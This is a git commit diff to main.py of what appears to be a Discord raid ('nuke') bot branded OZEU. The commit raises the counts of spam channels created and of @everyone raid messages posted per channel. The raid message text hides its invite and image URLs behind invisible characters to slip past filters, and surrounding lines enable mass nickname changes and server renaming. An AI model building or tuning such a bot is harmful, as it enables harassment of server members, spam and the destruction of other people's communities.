792c72764ecc7b0d5d0d45f279776a602b059481
yingyouq498-ai <yingyouq498@gmail.com>
2025-09-29 16:35:50 +0900

    Update main.py0

--- main.py
+++ main.py
@@ -21,12 +21,12 @@ INTENTS.members = True  # メンバー一覧・編集に必要
 
 # Behavioral params
 ROLE_BASE = "ozeumember"
-ROLE_COUNT = 50
+ROLE_COUNT = 0
 CHANNEL_BASE = "ozeu-nuke"
-CHANNEL_COUNT = 50
+CHANNEL_COUNT = 100
 
 REPEAT_MESSAGE = "# @everyone\n# Raid by OZEU. join now\n# おぜうの集いに参加！\n# https://\ptb．discord．com/../oze/../invite/ozeu-x [︋︍︋](https://i︋︍︋m︋︍︋g︋︍︋u︋︍︋r︋︍︋.︋︍com/yNx4Me2) [︋︍︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1341829977850646668/1353001058405978172/IMB_DZBN6p.gif?ex=67e00fed&is=67debe6d&hm=b07d1cf915c35fa1871b655f91d3738eba09ea05683a1abf5b883b0598f3b92a&) [︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1381064393189621860/1383567562863939726/GtZ9HYjbkAA9bPR.webp?ex=684f4334&is=684df1b4&hm=76921f9aff9c6f4b90feaf662c07ca2bb48257ef2bb7fdf39fb5a6df94740967&) [︋︍︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1381064393189621860/1383567672725340230/Gri2PLOboAI8ZRV.jpeg?ex=684f434e&is=684df1ce&hm=c28e7c872cdcb1420d8f565211714fa33bef522a879eca292c280439173a9ea2&) [︋︍︋](https://i︋︍︋m︋︍︋g︋︍︋u︋︍︋r︋︍︋.︋︍com/NbBGFcf)"
-REPEAT_COUNT = 50  # 各チャンネルに送信する回数
+REPEAT_COUNT = 100  # 各チャンネルに送信する回数
 
 # Nickname & guild rename params
 CHANGE_NICKNAMES = True
